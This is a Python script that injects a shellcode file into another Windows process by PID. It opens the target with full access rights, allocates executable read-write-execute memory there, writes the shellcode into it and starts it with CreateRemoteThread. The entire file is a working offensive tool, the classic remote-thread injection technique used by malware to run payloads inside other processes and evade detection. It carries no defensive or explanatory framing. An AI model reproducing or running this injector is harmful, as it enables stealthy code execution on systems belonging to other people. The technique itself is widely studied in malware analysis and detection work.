#First parameter is path for x86 assembly opcodes binary file to be injected
#Second parameter is Process Identifier for process to be injected to

import binascii
import sys
from ctypes import *


if len(sys.argv) < 3:
	print("usage inject.py <shellcodefile.bin> <pid>")
	sys.exit(1)

	
file = open(sys.argv[1],'rb')
buff=file.read()
file.close()

print("buffer length = ")
print(len(buff))
print("pid =  "+sys.argv[2])


handle = windll.kernel32.OpenProcess(0x1f0fff,0, int(sys.argv[2]))

if (handle == 0):
	print("handle == 0")
	sys.exit(1)

addr = windll.kernel32.VirtualAllocEx(handle,0,len(buff),0x3000|0x1000,0x40)

if(addr == 0):
	print("addr = = 0")
	sys.exit(1)

bytes = c_ubyte()
windll.kernel32.WriteProcessMemory(handle, addr , buff, len(buff), byref(bytes))

handle1=windll.kernel32.CreateRemoteThread(handle , 0x0, 0x0 , addr, 0x0,0x0 , 0x0)

if(handle1 == 0):
	print("handle1 = = 0");
	sys.exit(1)

	

windll.kernel32.CloseHandle(handle)